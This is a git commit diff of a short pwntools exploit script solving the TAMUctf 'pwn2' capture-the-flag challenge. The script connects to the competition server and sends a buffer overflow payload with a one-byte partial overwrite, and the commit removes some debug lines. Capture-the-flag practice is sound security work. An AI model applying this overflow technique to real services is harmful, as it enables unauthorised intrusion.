5086a911225de06e9d0c059f2858fef36a6f2e0a
arvinch <16729295+arvinch@users.noreply.github.com>
2019-04-04 01:14:25 +0800

    Update 2.py

--- TAMUctf/pwn2/2.py
+++ TAMUctf/pwn2/2.py
@@ -2,13 +2,10 @@ from pwn import *
 
 #p = process('./pwn2')
 p=remote("pwn.tamuctf.com",4322)
-#gdb.attach(p)
 
 p.recvuntil('Which function would you like to call?')
-print '1'
 payload='a'*30+'\xd8'
 p.sendline(payload)
 
 a=p.recvall()
 print a
-#p.interactive()
